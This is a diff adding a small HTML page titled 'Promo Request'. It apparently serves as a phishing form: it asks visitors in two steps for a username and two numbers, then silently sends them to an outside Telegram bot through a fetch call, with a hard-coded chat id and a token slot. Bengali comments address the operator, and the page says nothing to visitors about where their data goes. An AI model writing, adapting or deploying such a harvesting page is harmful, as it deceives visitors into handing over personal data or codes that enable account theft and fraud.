@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Promo Request</title>
+
+<style>
+body{font-family:Arial;background:#111;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
+.box{background:#1c1c1c;padding:20px;border-radius:10px;width:300px;text-align:center;}
+input{width:100%;padding:10px;margin:8px 0;border:none;border-radius:5px;}
+button{width:100%;padding:10px;background:#00c853;border:none;color:#fff;border-radius:5px;}
+.hidden{display:none;}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<div id="step1">
+<h3>User Info</h3>
+<input id="username" placeholder="Username">
+<input id="num1" placeholder="Number">
+<button onclick="next()">Next</button>
+</div>
+
+<div id="step2" class="hidden">
+<h3>More Number</h3>
+<input id="num2" placeholder="Another Number">
+<button onclick="send()">Submit</button>
+</div>
+
+</div>
+
+<script>
+
+function next(){
+document.getElementById("step1").classList.add("hidden");
+document.getElementById("step2").classList.remove("hidden");
+}
+
+function send(){
+
+let username=document.getElementById("username").value;
+let num1=document.getElementById("num1").value;
+let num2=document.getElementById("num2").value;
+
+let text=`User: ${username}%0ANumber1: ${num1}%0ANumber2: ${num2}`;
+
+// 🔐 এখানে আপনার NEW bot token বসাবেন
+let token="PUT_NEW_TOKEN_HERE";
+
+// ✅ আপনার দেওয়া chat id
+let chatid="240595975";
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${text}`)
+.then(()=>alert("Data Sent To Your Bot"))
+.catch(()=>alert("Error Sending Data"));
+
+}
+
+</script>
+
+</body>
+</html>
